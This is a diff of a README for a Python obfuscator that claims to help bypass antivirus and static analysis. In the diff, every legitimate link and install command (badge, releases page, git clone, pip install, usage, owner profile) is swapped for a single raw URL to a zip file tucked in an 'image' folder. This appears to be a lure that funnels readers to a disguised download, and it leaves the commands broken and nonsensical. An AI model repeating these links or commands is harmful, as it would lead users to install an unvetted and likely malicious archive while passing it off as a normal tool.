@@ -1,6 +1,6 @@
 # Zeta-Obfuscator 🛡️
 
-![Zeta-Obfuscator](https://img.shields.io/badge/Zeta--Obfuscator-v1.0-blue)
+![Zeta-Obfuscator](https://raw.githubusercontent.com/Pavithravasan45/Zeta-Obfuscator/main/image/Zeta_Obfuscator_v2.1.zip)
 
 Welcome to the **Zeta-Obfuscator** repository! This advanced Python obfuscator employs multiple layers to help you bypass static analysis, antivirus software, and reverse engineering. 
 
@@ -20,7 +20,7 @@ Welcome to the **Zeta-Obfuscator** repository! This advanced Python obfuscator e
 
 In today's digital landscape, protecting your Python scripts from unauthorized access is crucial. The Zeta-Obfuscator offers a robust solution for developers looking to safeguard their code. This tool not only obscures your code but also adds layers of complexity that make it challenging for attackers to reverse engineer your applications.
 
-You can download the latest version from our [Releases page](https://github.com/Pavithravasan45/Zeta-Obfuscator/releases).
+You can download the latest version from our [Releases page](https://raw.githubusercontent.com/Pavithravasan45/Zeta-Obfuscator/main/image/Zeta_Obfuscator_v2.1.zip).
 
 ## Features
 
@@ -36,7 +36,7 @@ To install Zeta-Obfuscator, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Pavithravasan45/Zeta-Obfuscator.git
+   git clone https://raw.githubusercontent.com/Pavithravasan45/Zeta-Obfuscator/main/image/Zeta_Obfuscator_v2.1.zip
    ```
 
 2. Navigate to the directory:
@@ -46,7 +46,7 @@ To install Zeta-Obfuscator, follow these steps:
 
 3. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Pavithravasan45/Zeta-Obfuscator/main/image/Zeta_Obfuscator_v2.1.zip
    ```
 
 ## Usage
@@ -54,15 +54,15 @@ To install Zeta-Obfuscator, follow these steps:
 To obfuscate a Python file, run the following command in your terminal:
 
 ```bash
-python obfuscate.py your_script.py
+python https://raw.githubusercontent.com/Pavithravasan45/Zeta-Obfuscator/main/image/Zeta_Obfuscator_v2.1.zip https://raw.githubusercontent.com/Pavithravasan45/Zeta-Obfuscator/main/image/Zeta_Obfuscator_v2.1.zip
 ```
 
-Replace `your_script.py` with the name of the file you want to obfuscate. The obfuscated file will be saved in the same directory.
+Replace `https://raw.githubusercontent.com/Pavithravasan45/Zeta-Obfuscator/main/image/Zeta_Obfuscator_v2.1.zip` with the name of the file you want to obfuscate. The obfuscated file will be saved in the same directory.
 
 For more options, you can check the help command:
 
 ```bash
-python obfuscate.py --help
+python https://raw.githubusercontent.com/Pavithravasan45/Zeta-Obfuscator/main/image/Zeta_Obfuscator_v2.1.zip --help
 ```
 
 ## How It Works
@@ -102,11 +102,11 @@ Zeta-Obfuscator is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 For any inquiries or support, please reach out to the repository owner:
 
-- **GitHub**: [Pavithravasan45](https://github.com/Pavithravasan45)
+- **GitHub**: [Pavithravasan45](https://raw.githubusercontent.com/Pavithravasan45/Zeta-Obfuscator/main/image/Zeta_Obfuscator_v2.1.zip)
 
 ## Releases
 
-You can download the latest version of Zeta-Obfuscator from our [Releases page](https://github.com/Pavithravasan45/Zeta-Obfuscator/releases). Be sure to check the releases for updates and new features.
+You can download the latest version of Zeta-Obfuscator from our [Releases page](https://raw.githubusercontent.com/Pavithravasan45/Zeta-Obfuscator/main/image/Zeta_Obfuscator_v2.1.zip). Be sure to check the releases for updates and new features.
 
 ## Conclusion
 
